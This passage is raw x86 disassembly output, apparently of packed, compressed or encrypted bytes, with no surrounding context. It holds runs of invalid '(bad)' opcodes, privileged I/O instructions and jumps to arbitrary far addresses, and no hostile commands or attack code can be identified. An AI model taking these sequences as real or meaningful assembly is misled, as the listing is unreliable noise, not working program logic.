  42935d:	and    al,0x47
  42935f:	out    0x87,eax
  429361:	cmp    ecx,DWORD PTR [eax+edx*4]
  429364:	les    edi,FWORD PTR [edx+0x75d8bff7]
  42936a:	sbb    eax,DWORD PTR [ebp+0x91b4]
	...
  4293d4:	add    BYTE PTR [eax],al
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x74
  4293e3:	test   BYTE PTR [eax+0x1ba67b5],0x0
  4293ea:	add    BYTE PTR [ecx],al
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	adc    DWORD PTR [esi],0xffffffd2
  4293f1:	jae    0x4293a0
  4293f3:	add    eax,0x752a26b9
  4293f8:	rcl    BYTE PTR [ebx],1
  4293fa:	(bad)  
  4293fb:	mov    edi,es
  4293fd:	dec    ebx
  4293fe:	pop    es
  4293ff:	mov    fs,WORD PTR [ecx+0x53]
  429402:	dec    ebp
  429403:	hlt    
  429404:	out    dx,eax
  429405:	mov    BYTE PTR [edx-0xc80d70c],ch
  42940b:	outs   dx,BYTE PTR ds:[esi]
  42940c:	push   ecx
  42940d:	jecxz  0x42947f
  42940f:	repnz ins DWORD PTR es:[edi],dx
  429411:	jg     0x4293d2
  429413:	adc    ebx,DWORD PTR [eax]
  429415:	dec    edi
  429416:	test   BYTE PTR [ebp+ebx*4+0x2afbf281],ch
  42941d:	mov    ds:0xb9851c80,eax
  429422:	adc    DWORD PTR [ebp+esi*8+0x7e715be8],edi
  429429:	push   eax
  42942a:	add    al,0x46
  42942c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42942d:	mov    dh,0x3d
  42942f:	inc    edi
  429430:	(bad)  
  429432:	mov    esi,0x13002cb7
  429437:	add    ah,BYTE PTR [ebx+0x64]
  42943a:	pop    ebp
  42943b:	and    eax,0xf80f7e3b
  429440:	sbb    esi,DWORD PTR [edi-0x79]
  429443:	push   esp
  429444:	scas   eax,DWORD PTR es:[edi]
  429445:	call   0x141fee61
  42944a:	cmp    bl,BYTE PTR [eax+0x12ff1cea]
  429450:	inc    ecx
  429451:	nop    DWORD PTR [ebx-0x519bdd5d]
  429458:	xchg   esi,eax
  429459:	int    0x6d
  42945b:	mov    edx,0x343e745
  429460:	aas    
  429461:	sbb    dl,0x64
  429464:	sub    al,0x7
  429466:	and    eax,0x499d160
  42946b:	stos   DWORD PTR es:[edi],eax
  42946c:	or     al,0x2
  42946e:	push   0x70
  429470:	pusha  
  429471:	retf   
  429472:	rcr    DWORD PTR [edx+0x32820f61],0x3a
  429479:	xor    dl,BYTE PTR [ebx-0x2b]
  42947c:	retf   0xd8cf
  42947f:	sub    BYTE PTR [ebx],0x6f
  429482:	adc    ebp,DWORD PTR [eax-0x52f1bcbe]
  429488:	imul   ebx,eax,0xffffffd5
  42948b:	mov    al,0x39
  42948d:	mov    ebx,0x14d932ff
  429492:	add    eax,0x3510cc8a
  429497:	cli    
  429498:	shr    ah,1
  42949a:	sub    DWORD PTR [eax+0x21],ecx
  42949d:	int    0x20
  42949f:	in     eax,0xb7
  4294a1:	(bad)  
  4294a2:	xchg   edi,eax
  4294a3:	dec    ebp
  4294a4:	cmp    DWORD PTR [ecx],ebx
  4294a6:	sar    BYTE PTR [edi+0x2af0c94c],0xed
  4294ad:	sbb    edx,DWORD PTR [edx]
  4294af:	mov    DWORD PTR [ebx+0x731eb499],ebx
  4294b5:	and    al,BYTE PTR [ebx-0x850db7e]
  4294bb:	xchg   ecx,eax
  4294bc:	dec    esi
  4294bd:	pop    esi
  4294be:	int3   
  4294bf:	int3   
  4294c0:	scas   eax,DWORD PTR es:[edi]
  4294c1:	pop    ebx
  4294c2:	pop    ecx
  4294c3:	pushf  
  4294c4:	rcr    BYTE PTR [edx+0x24e21263],cl
  4294ca:	jnp    0x4294ad
  4294cc:	mov    esp,0x37c278dc
  4294d1:	arpl   WORD PTR [edx+0x9],cx
  4294d4:	sbb    eax,DWORD PTR [eax]
  4294d6:	div    BYTE PTR [esi-0x51]
  4294d9:	pop    edi
  4294da:	push   ss
  4294db:	repnz in al,dx
  4294dd:	int    0xa2
  4294df:	and    al,BYTE PTR [ebx]
  4294e1:	push   esi
  4294e2:	mov    cl,0x8d
  4294e4:	sub    bh,BYTE PTR ds:0x604c2136
  4294ea:	es xchg edx,eax
  4294ec:	mov    dh,0x7c
	...
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x72d861ea],dx
  429565:	and    al,0x67
  429567:	mov    ebx,0x1000001
  42956c:	add    BYTE PTR [eax],al
  42956e:	xchg   BYTE PTR [ebp-0x3abb20c6],dl
  429574:	lahf   
  429575:	sub    al,BYTE PTR [ecx+eiz*2+0x78]
  429579:	stos   BYTE PTR es:[edi],al
  42957a:	mov    cl,0x59
  42957c:	inc    esp
  42957d:	and    edx,0xe985653
  429583:	into   
  429584:	or     bh,ch
  429586:	retf   
  429587:	push   esp
  429588:	dec    ebp
  429589:	mov    al,ds:0xbaa042de
  42958e:	push   cs
  42958f:	je     0x4295d1
  429591:	jno    0x429595
  429593:	pushf  
  429594:	jl     0x4295bb
  429596:	sar    ebp,0xca
  429599:	push   ebx
  42959a:	pop    edx
  42959b:	or     eax,0x28c22886
  4295a0:	pushf  
  4295a1:	cdq    
  4295a2:	bound  ebx,QWORD PTR [ebp-0x30]
  4295a5:	mov    dl,0x98
  4295a7:	ret    0x8f66
  4295aa:	aad    0x59
  4295ac:	pop    ds
  4295ad:	pushf  
  4295ae:	mov    al,0x3f
  4295b0:	mov    edx,0x79203b98
  4295b5:	push   ss
  4295b6:	ficomp DWORD PTR [edx-0x58eeaefc]
  4295bc:	sub    al,0xb1
  4295be:	(bad)  [eax]
  4295c0:	add    edx,eax
  4295c2:	in     al,0xa2
  4295c4:	imul   esp,DWORD PTR [edx+0x31fa82a6],0xfedf6828
  4295ce:	pop    ecx
  4295cf:	push   0xafdf9173
  4295d4:	adc    al,0x71
  4295d6:	add    DWORD PTR [eax],esi
  4295d8:	ins    BYTE PTR es:[edi],dx
  4295d9:	mov    ds:0x23157479,al
  4295de:	cmp    BYTE PTR [edi+0x31],dh
  4295e1:	test   BYTE PTR [eax+0x6b],dh
  4295e4:	push   0x9
  4295e6:	xchg   ebp,eax
  4295e7:	xchg   BYTE PTR [ebx],ch
  4295e9:	mov    edi,0x3300f86f
  4295ee:	scas   eax,DWORD PTR es:[edi]
  4295ef:	add    BYTE PTR [ebx+0x7c],ah
  4295f2:	dec    edi
  4295f3:	or     al,0xa1
  4295f5:	inc    ebx
  4295f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295f7:	add    eax,0x53e6a45f
  4295fc:	add    DWORD PTR [edi+0x58],esp
  4295ff:	jg     0x42964f
  429601:	aas    
  429602:	inc    eax
  429603:	psubd  mm4,QWORD PTR [ebp+0x18]
  429607:	pop    ss
  429608:	push   ebx
  429609:	loop   0x4295e1
  42960b:	inc    ebx
  42960c:	mov    cl,0xdb
  42960e:	cdq    
  42960f:	mov    al,0xea
  429611:	or     BYTE PTR [eax],cl
  429613:	xor    BYTE PTR [ecx+0x7d5a0473],al
  429619:	out    dx,eax
  42961a:	mov    DWORD PTR [ebp+0xdb9ac97],ecx
  429620:	mov    fs,ecx
  429622:	(bad)  
  429623:	mov    ds:0x9af7888d,eax
  429628:	mov    es,edx
  42962a:	lahf   
  42962b:	or     eax,0xc9d0fb8a
  429630:	inc    ecx
  429631:	push   0xffffffb2
  429633:	mov    dl,0xa1
  429635:	in     al,0xb3
  429637:	xor    BYTE PTR [edi+0x6607b5af],bl
  42963d:	mov    ah,0x23
  42963f:	aad    0x40
  429641:	sbb    esp,edx
  429643:	gs gs (bad) 
  429646:	xor    al,0x43
  429648:	mov    esp,0xedfd71e3
  42964d:	out    dx,al
  42964e:	sbb    BYTE PTR [ebx],bl
  429650:	popf   
  429651:	iret   
  429652:	mov    ds:0x6c122764,eax
  429657:	(bad)  
  429658:	aas    
  429659:	pop    ebp
  42965a:	push   esi
  42965b:	stos   BYTE PTR es:[edi],al
  42965c:	mov    eax,ds:0x73355288
  429661:	leave  
  429662:	mov    esi,0xe375eec
  429667:	push   0x6c79237b
  42966c:	jg     0x4296a2
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	rcl    BYTE PTR [ebx-0x13],0x8e
  4296e6:	addr16 mov esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	add    edx,0x55
  4296f1:	pop    ebx
  4296f2:	fsubr  DWORD PTR [ebp+edi*8+0x46]
  4296f6:	cmp    DWORD PTR [edx],0xffffffe6
  4296f9:	dec    edx
  4296fa:	sub    esp,edi
  4296fc:	out    dx,al
  4296fd:	pop    ecx
  4296fe:	leave  
  4296ff:	and    eax,0xb91f0bf6
  429704:	inc    ecx
  429705:	(bad)  
  429706:	out    dx,al
  429707:	imul   ebx,DWORD PTR [ecx+0x755485df],0xc17e1030
  429711:	lods   al,BYTE PTR ds:[esi]
  429712:	xchg   ebx,eax
  429713:	rcr    ebx,1
  429715:	stc    
  429716:	das    
  429717:	or     eax,0xbaa460f1
  42971c:	push   ss
  42971d:	mov    al,ds:0xecea27b4
  429722:	push   eax
  429723:	mov    WORD PTR [ebx-0x7e],es
  429726:	fnstenv ds:0x75ce9369
  42972c:	adc    BYTE PTR [eax-0xd],bh
  42972f:	ds xchg ebp,eax
  429731:	call   0xba91:0xf1785414
  429738:	(bad)  
  429739:	std    
  42973a:	inc    edi
  42973b:	and    BYTE PTR [eax+0x7e],0x48
  42973f:	cmp    al,0x5
  429741:	ret    0x12d5
  429744:	jbe    0x4297b9
  429746:	pop    ecx
  429747:	out    0xea,eax
  429749:	jl     0x4296eb
  42974b:	jae    0x429730
  42974d:	inc    esi
  42974e:	ret    
  42974f:	adc    al,dh
  429751:	mov    al,ds:0xda3b6f4
  429756:	loopne 0x4297a2
  429758:	inc    esi
  429759:	jns    0x4297a9
  42975b:	or     BYTE PTR [esi-0x2dfee01b],al
  429761:	hlt    
  429762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429763:	fsub   QWORD PTR [esi]
  429765:	sbb    edi,DWORD PTR [ecx-0x2b77b0e0]
  42976b:	loop   0x429789
  42976d:	icebp  
  42976e:	push   ds
  42976f:	in     al,0x2b
  429771:	int3   
  429772:	xor    al,0x33
  429774:	and    bh,BYTE PTR [edx+ebx*1+0x45785843]
  42977b:	retf   0x98c3
  42977e:	mov    bh,0x35
  429780:	cmp    al,0x8e
  429782:	and    al,BYTE PTR [edi-0x20]
  429785:	fstp   TBYTE PTR [edx]
  429787:	mov    dl,cl
  429789:	add    ecx,DWORD PTR [ebp-0x15]
  42978c:	sbb    al,BYTE PTR [ecx+eiz*8+0x1e]
  429790:	jmp    0xf0cf:0x549a42e6
  429797:	into   
  429798:	mov    esi,DWORD PTR [ebp+0x3a]
  42979b:	js     0x42980e
  42979d:	mov    ecx,0x8dd5ddd4
  4297a2:	mov    dh,0x7
  4297a4:	lock push ebx
  4297a6:	and    esi,eax
  4297a8:	push   ds
  4297a9:	pusha  
  4297aa:	pop    es
  4297ab:	dec    eax
  4297ac:	div    BYTE PTR [edx]
  4297ae:	push   ecx
  4297af:	ss add al,0x53
  4297b2:	sti    
  4297b3:	daa    
  4297b4:	jmp    0xcfa91cbb
  4297b9:	adc    DWORD PTR [edi-0x3b],edx
  4297bc:	dec    ecx
  4297bd:	pop    ds
  4297be:	mov    ch,0x22
  4297c0:	adc    ebx,DWORD PTR [ebx+eiz*2]
  4297c3:	jae    0x42976d
  4297c5:	push   ss
  4297c6:	test   DWORD PTR [ebx+ecx*2],edx
  4297c9:	xor    bl,BYTE PTR [edx+0x31]
  4297cc:	es jp  0x429750
  4297cf:	enter  0xc70e,0x1d
  4297d3:	add    esp,DWORD PTR [ebp-0x264d6485]
  4297d9:	mov    WORD PTR [edx-0x22],gs
  4297dc:	mov    ch,0x73
  4297de:	inc    edi
  4297df:	icebp  
  4297e0:	sbb    DWORD PTR es:[edi+0x54],0xf
  4297e5:	mov    ch,0x90
  4297e7:	ins    DWORD PTR es:[edi],dx
  4297e8:	bound  ecx,QWORD PTR [ebx]
  4297ea:	mov    dl,0x2f
  4297ec:	jmp    0x42983b
	...
  429855:	add    BYTE PTR [eax],dh
  429857:	inc    edx
  429858:	fbld   TBYTE PTR [edx-0x1]
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	add    ch,BYTE PTR [edi-0x4298cacc]
  429868:	add    DWORD PTR [eax],eax
  42986a:	add    BYTE PTR [ecx],al
  42986c:	add    BYTE PTR [eax],al
  42986e:	and    bl,BYTE PTR [esi-0x23]
  429871:	out    0x76,eax
  429873:	bnd jmp 0xfe78bb8a
  429879:	in     al,dx
  42987a:	sub    BYTE PTR [eax-0x3e],ah
  42987d:	mov    eax,0xb3e1b893
  429882:	test   eax,0x29faf6d7
  429887:	ret    0x8947
  42988a:	pop    ebp
  42988b:	sub    al,0x53
  42988d:	pop    es
  42988e:	inc    esp
  42988f:	and    ch,BYTE PTR cs:[ecx-0x7b]
  429893:	pop    ebx
  429894:	ss jmp 0x408c:0x2a084467
  42989c:	and    edx,edx
  42989e:	(bad)  [edi+eiz*8-0x15]
  4298a2:	je     0x42986c
  4298a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298a5:	inc    eax
  4298a6:	fisttp DWORD PTR [eax+0x47f956b8]
  4298ac:	pop    ds
  4298ad:	repz push edx
  4298af:	xor    BYTE PTR [eax-0x54],cl
  4298b2:	scas   eax,DWORD PTR es:[edi]
  4298b3:	push   ecx
  4298b4:	and    eax,0xd7a660ab
  4298b9:	mov    al,0x9a
  4298bb:	mov    eax,0xa4bb81ea
  4298c0:	test   al,0xa5
  4298c2:	lds    esp,FWORD PTR [ebx+0x1d]
  4298c5:	sahf   
  4298c6:	cmp    DWORD PTR [edi-0x32be1fb],ebp
  4298cc:	js     0x4298e1
  4298ce:	mov    ds:0xd1f31d9a,eax
  4298d3:	push   edx
  4298d4:	mov    cl,0xea
  4298d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298d7:	popf   
  4298d8:	fcom   QWORD PTR [ebp+0x4ab514f]
  4298de:	lahf   
  4298df:	xchg   ebp,eax
  4298e0:	cmp    al,BYTE PTR [ebx-0x24dcfeef]
  4298e6:	fdivr  QWORD PTR [esi]
  4298e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298e9:	adc    esi,ecx
  4298eb:	test   al,cl
  4298ed:	test   BYTE PTR [esi],0x97
  4298f0:	popa   
  4298f1:	lea    ebp,[esi]
  4298f3:	in     al,0xb
  4298f5:	rol    ebx,0x7a
  4298f8:	aam    0xc3
  4298fa:	push   ss
  4298fb:	jno    0x429962
  4298fd:	enter  0x9f8,0x81
  429901:	retf   0xf20a
  429904:	pop    ebp
  429905:	loope  0x429980
  429907:	or     cl,BYTE PTR [ebx+0x52800313]
  42990d:	xor    DWORD PTR [ebp+0x72ebbf0c],edx
  429913:	mov    ebx,0x17b83fc9
  429918:	call   0x3d91:0x19af314e
  42991f:	xor    eax,0x3e471e0
  429924:	cli    
  429925:	in     eax,dx
  429926:	icebp  
  429927:	or     eax,0x167f773
  42992c:	jne    0x4298ae
  42992e:	(bad)  
  42992f:	jae    0x4298bb
  429931:	inc    esi
  429932:	adc    eax,ecx
  429934:	jecxz  0x42991c
  429936:	dec    edx
  429937:	or     eax,0xb50cd4b9
  42993c:	jmp    0x4299a0
  42993e:	or     eax,0x1313e967
  429943:	mov    ch,0xa4
  429945:	mov    BYTE PTR [eax],ah
  429947:	and    bh,al
  429949:	push   ss
  42994a:	js     0x42999c
  42994c:	pop    ebp
  42994d:	and    ah,BYTE PTR [edx]
  42994f:	mov    ecx,0x45ef9aaf
  429954:	pop    ebx
  429955:	fsubr  DWORD PTR [esi+0x2e]
  429958:	jge    0x429912
  42995a:	inc    edi
  42995b:	jae    0x4298ef
  42995d:	xor    eax,0x4b3f89ea
  429962:	add    al,0xd2
  429964:	sar    BYTE PTR [ecx-0x24],0xdb
  429968:	int3   
  429969:	fnstcw WORD PTR [ecx]
  42996b:	dec    ecx
  42996c:	std    
  42996d:	xor    eax,DWORD PTR [eax]
	...
  4299d3:	add    BYTE PTR [eax],al
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	cmp    cl,cl
  4299e4:	and    edx,DWORD PTR [edi+eiz*2-0x42]
  4299e8:	add    DWORD PTR [eax],eax
  4299ea:	add    BYTE PTR [ecx],al
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	pop    ecx
  4299ef:	xchg   ebp,eax
  4299f0:	push   DWORD PTR [esi]
  4299f2:	fdivr  DWORD PTR [esi]
  4299f4:	mov    bl,BYTE PTR [esi]
  4299f6:	imul   ebp,DWORD PTR [edx],0x7a
  4299f9:	fldenv [edi+0x357b5caf]
  4299ff:	data16 mov al,0x2d
  429a02:	std    
  429a03:	xor    dh,ah
  429a05:	arpl   WORD PTR [edx-0x6948f28f],di
  429a0b:	stc    
  429a0c:	and    DWORD PTR [ecx+0x287c4aa7],esi
  429a12:	fiadd  WORD PTR [esi+eax*4]
  429a15:	stos   BYTE PTR es:[edi],al
  429a16:	mov    ebp,ebp
  429a18:	mov    bl,0x6d
  429a1a:	sbb    esi,DWORD PTR [esi+ebp*1]
  429a1d:	add    eax,0xe83edc69
  429a22:	sub    DWORD PTR [ebx+0x71c8db72],eax
  429a28:	xchg   DWORD PTR [eax+ebp*1+0x68],ebx
  429a2c:	ret    
  429a2d:	leave  
  429a2e:	leave  
  429a2f:	repnz lock inc esi
  429a32:	jecxz  0x4299f6
  429a34:	pushf  
  429a35:	rcl    BYTE PTR [edx],cl
  429a37:	push   0x67f4bd9
  429a3c:	pusha  
  429a3d:	data16 setns BYTE PTR [edx]
  429a41:	sbb    esp,DWORD PTR [ebp+0x71868959]
  429a47:	push   esi
  429a48:	cmp    al,0x6c
  429a4a:	sub    DWORD PTR [eax],0xf7a94475
  429a50:	dec    ecx
  429a51:	cmovbe esi,DWORD PTR [edi-0x1e]
  429a55:	pop    ebx
  429a56:	inc    ebp
  429a57:	ds loope 0x429a88
  429a5a:	add    eax,0x6f17f825
  429a5f:	int    0xe4
  429a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a62:	call   0xf5db43fe
  429a67:	sub    al,0x64
  429a69:	pop    eax
  429a6a:	push   ds
  429a6b:	push   eax
  429a6c:	popf   
  429a6d:	fild   QWORD PTR [ebx+0x5a]
  429a70:	push   edi
  429a71:	stos   BYTE PTR es:[edi],al
  429a72:	fiadd  WORD PTR [ebx-0x4002f8e9]
  429a78:	xor    eax,0xba2ec09f
  429a7d:	mov    eax,0xf9cc0214
  429a82:	not    BYTE PTR [eax+0x406ed1a2]
  429a88:	or     dh,BYTE PTR [edx-0x29]
  429a8b:	xchg   esi,eax
  429a8c:	adc    BYTE PTR [edx+0x33],cl
  429a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a90:	into   
  429a91:	mov    eax,DWORD PTR [edx]
  429a93:	push   es
  429a94:	jns    0x429a4a
  429a96:	stc    
  429a97:	jp     0x429acc
  429a99:	or     ebx,ebp
  429a9b:	pop    ecx
  429a9c:	retf   
  429a9d:	popa   
  429a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a9f:	scas   eax,DWORD PTR es:[edi]
  429aa0:	lock mov al,0x6e
  429aa3:	or     BYTE PTR [ebp+0x16],0xbc
  429aa7:	inc    eax
  429aa8:	xchg   esi,eax
  429aa9:	jb     0x429aea
  429aab:	scas   eax,DWORD PTR es:[edi]
  429aac:	cld    
  429aad:	jne    0x429ae1
  429aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ab0:	(bad)  
  429ab1:	sbb    eax,ebp
  429ab3:	dec    esp
  429ab4:	push   es
  429ab5:	leave  
  429ab6:	jo     0x429b2f
  429ab8:	(bad)  
  429ab9:	stos   DWORD PTR es:[edi],eax
  429aba:	jne    0x429b16
  429abc:	dec    edx
  429abd:	ret    
  429abe:	sub    al,0x34
  429ac0:	sahf   
  429ac1:	sub    esp,0x65
  429ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ac5:	sbb    ebp,ecx
  429ac7:	sbb    edx,ecx
  429ac9:	cdq    
  429aca:	(bad)  
  429acb:	xchg   ebp,eax
  429acc:	xchg   edx,eax
  429acd:	je     0x429abd
  429acf:	jno    0x429a69
  429ad1:	mov    ch,0xed
  429ad3:	mov    bl,0x3c
  429ad5:	mov    dl,0xfd
  429ad7:	adc    DWORD PTR [edx-0x20732c89],0xffffffd5
  429ade:	xchg   BYTE PTR [edi],ch
  429ae0:	jne    0x429ac5
  429ae2:	adc    al,0x67
  429ae4:	(bad)  
  429ae5:	mov    WORD PTR [esi+0x4d80cf2],es
  429aeb:	adc    edi,DWORD PTR [esi+0xf]
	...
  429b55:	add    dh,cl
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0xa8a95667
  429b63:	retf   0x6424
  429b66:	addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	rcr    DWORD PTR [ecx-0x4a],1
  429b71:	daa    
  429b72:	pop    ebp
  429b73:	int    0xe0
  429b75:	and    dl,BYTE PTR [ecx+edx*4+0x66]
  429b79:	sub    eax,DWORD PTR [edx-0x11ebaa94]
  429b7f:	xchg   ebp,eax
  429b80:	or     ebp,DWORD PTR [edi-0x77]
  429b83:	(bad)  
  429b84:	out    dx,eax
  429b85:	mov    ebp,0xd0f8c37c
  429b8a:	or     al,0x5
  429b8c:	lea    edx,[ebx]
  429b8e:	mov    ah,ch
  429b90:	add    esi,ebp
  429b92:	or     DWORD PTR [ecx],0x39
  429b95:	push   0xffffffc7
  429b97:	cmp    esi,DWORD PTR [edx]
  429b99:	gs ds cs stos BYTE PTR es:[edi],al
  429b9d:	sub    bl,ah
  429b9f:	es and dl,BYTE PTR ss:[edi+edx*8]
  429ba4:	inc    edi
  429ba5:	sahf   
  429ba6:	or     bl,BYTE PTR [ecx-0x51]
  429ba9:	add    eax,0xf2bf2d65
  429bae:	ins    BYTE PTR es:[edi],dx
  429baf:	jecxz  0x429c27
  429bb1:	sbb    edi,ebp
  429bb3:	sti    
  429bb4:	jp     0x429c0b
  429bb6:	in     eax,dx
  429bb7:	icebp  
  429bb8:	call   0x820c:0xd73bcb51
  429bbf:	pop    es
  429bc0:	push   esp
  429bc1:	imul   edi,DWORD PTR [esi+ebp*4],0xfffffff7
  429bc5:	jmp    ebp
  429bc7:	imul   eax,DWORD PTR [esi+0x3bb5848],0x5015c4db
  429bd1:	adc    bh,ch
  429bd3:	inc    edx
  429bd4:	jne    0x429b87
  429bd6:	add    bh,dh
  429bd8:	sub    BYTE PTR [esi-0x8],dh
  429bdb:	loop   0x429c0f
  429bdd:	push   es
  429bde:	jne    0x429c5b
  429be0:	mov    edi,0xa21a584f
  429be5:	fnstcw WORD PTR [ecx-0x42ac2764]
  429beb:	imul   edi,DWORD PTR [edi+0x671017d7],0x12d31247
  429bf5:	out    0xef,al
  429bf7:	mov    WORD PTR [esi-0x2d],ss
  429bfa:	test   al,0xa0
  429bfc:	fwait
  429bfd:	imul   esi,DWORD PTR [edx+0x2feb6a9],0xb5db993b
  429c07:	(bad)  
  429c08:	xchg   esi,eax
  429c09:	mov    bh,0x20
  429c0b:	cmp    WORD PTR [edx+0x11],cx
  429c0f:	mov    al,ds:0x713fe2f8
  429c14:	pop    es
  429c15:	xor    al,0x47
  429c17:	inc    esp
  429c18:	test   DWORD PTR [ebx-0x4278cdea],esi
  429c1e:	imul   esi,DWORD PTR ds:0xcab614d6,0x6210abf
  429c28:	adc    ebx,esi
  429c2a:	les    esp,FWORD PTR [eax+0x1b]
  429c2d:	icebp  
  429c2e:	or     ah,BYTE PTR [edx-0x34]
  429c31:	and    BYTE PTR [ebx+0x46],ah
  429c34:	mov    dl,0x35
  429c36:	test   DWORD PTR [eax+eiz*4+0x62],0x3a072533
  429c3e:	mov    bh,0x4c
  429c40:	not    DWORD PTR [eax+ebx*2]
  429c43:	and    al,0x75
  429c45:	pop    ss
  429c46:	(bad)  
  429c47:	nop
  429c48:	(bad)  
  429c49:	fadd   DWORD PTR [edx]
  429c4b:	clc    
  429c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c4d:	push   cs
  429c4e:	mov    dl,0x90
  429c50:	sub    BYTE PTR [ecx+eax*4],bl
  429c53:	inc    esp
  429c54:	mov    ah,0x1a
  429c56:	jle    0x429cab
  429c58:	cmp    ecx,DWORD PTR [ebx-0x233e4daa]
  429c5e:	outs   dx,BYTE PTR ds:[esi]
  429c5f:	inc    edi
  429c60:	pop    esp
  429c61:	das    
  429c62:	ret    
  429c63:	or     bl,BYTE PTR [eax-0x22287ad0]
  429c69:	fimul  WORD PTR [esp+ecx*8]
  429c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c6d:	lds    eax,FWORD PTR [eax]
	...
  429cd3:	add    BYTE PTR [eax],al
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [edx-0x6b],dh
  429ce4:	ret    0x67b0
  429ce7:	rol    BYTE PTR [ecx],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	mov    eax,0x5256feef
  429cf3:	mov    BYTE PTR [edx+0x7ab46105],ah
  429cf9:	mov    ebx,0xd661c153
  429cfe:	xchg   edx,eax
  429cff:	push   cs
  429d00:	xor    ebp,DWORD PTR [esi]
  429d02:	pop    ss
  429d03:	and    al,0xf9
  429d05:	test   al,0x54
  429d07:	and    BYTE PTR [edi+eax*1+0x33],dh
  429d0b:	xor    esi,DWORD PTR [eax+0x51fd6ed3]
  429d11:	inc    eax
  429d12:	and    edi,DWORD PTR [eax]
  429d14:	cmp    eax,0xcd26e0d9
  429d19:	cmp    BYTE PTR [ebp-0xf2839ae],dh
  429d1f:	pop    edx
  429d20:	mov    eax,0x9989fd80
  429d25:	out    0x82,eax
  429d27:	imul   eax,DWORD PTR [eax-0x16],0xf4202a4c
  429d2e:	mov    gs,WORD PTR [edx]
  429d30:	mov    ch,BYTE PTR [eax+eiz*8+0x8]
  429d34:	sbb    DWORD PTR [edi-0x5],0xc6c07171
  429d3b:	jge    0x429d6a
  429d3d:	mov    dh,0x5f
  429d3f:	test   eax,0xbe60dca3
  429d44:	sahf   
  429d45:	ss jne 0x429daf
  429d48:	aas    
  429d49:	xchg   esp,eax
  429d4a:	out    0x94,al
  429d4c:	pop    esp
  429d4d:	mov    eax,0x2e8acd14
  429d52:	ins    BYTE PTR es:[edi],dx
  429d53:	cmp    DWORD PTR [edx],esi
  429d55:	outs   dx,BYTE PTR ds:[esi]
  429d56:	mov    DWORD PTR [esi-0x38],edx
  429d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d5a:	sbb    DWORD PTR [ecx+0xe7d8fb0],eax
  429d60:	and    eax,0x406c0eff
  429d65:	lods   al,BYTE PTR ds:[esi]
  429d66:	add    eax,0x3286a2a5
  429d6b:	mov    BYTE PTR [esi-0x48917d4b],bh
  429d71:	sub    eax,0x8053f129
  429d76:	lods   eax,DWORD PTR ds:[esi]
  429d77:	shl    BYTE PTR [edi-0x7050032a],cl
  429d7d:	cdq    
  429d7e:	mov    ah,0x7b
  429d80:	sar    BYTE PTR [ecx-0x3d012dd6],0x58
  429d87:	mov    ds:0x462eab9b,eax
  429d8c:	add    edi,DWORD PTR [edx+ebx*8-0x57]
  429d90:	mov    al,0xc
  429d92:	popa   
  429d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d94:	cmp    eax,DWORD PTR [esi+ebx*4-0x6c225a74]
  429d9b:	mov    ds,edx
  429d9d:	mov    ch,BYTE PTR [esp+eax*8+0x1e37fb8e]
  429da4:	clc    
  429da5:	imul   ecx
  429da7:	inc    ebx
  429da8:	inc    ebx
  429da9:	add    DWORD PTR [edi],eax
  429dab:	or     edx,DWORD PTR [ecx-0x64]
  429dae:	jno    0x429e19
  429db0:	inc    ecx
  429db1:	test   BYTE PTR [edi],dl
  429db3:	mov    ebp,0x2f09f925
  429db8:	inc    ecx
  429db9:	lock not BYTE PTR [ecx-0x3f863720]
  429dc0:	xchg   ecx,eax
  429dc1:	test   BYTE PTR [ebx],0x4b
  429dc4:	jb     0x429dd9
  429dc6:	xchg   ebp,eax
  429dc7:	cwde   
  429dc8:	prefetcht2 BYTE PTR [eax+ecx*2+0x1e]
  429dcd:	xor    eax,0x6ce642f2
  429dd2:	je     0x429e33
  429dd4:	xor    BYTE PTR [ecx+0x5c],dh
  429dd7:	inc    esi
  429dd8:	fmul   QWORD PTR [edx+0x7f]
  429ddb:	add    BYTE PTR [ebx+ebx*2],0xed
  429ddf:	xchg   DWORD PTR [ebx+0x78be97b8],edx
  429de5:	cmc    
  429de6:	test   BYTE PTR [edi+0x43],bh
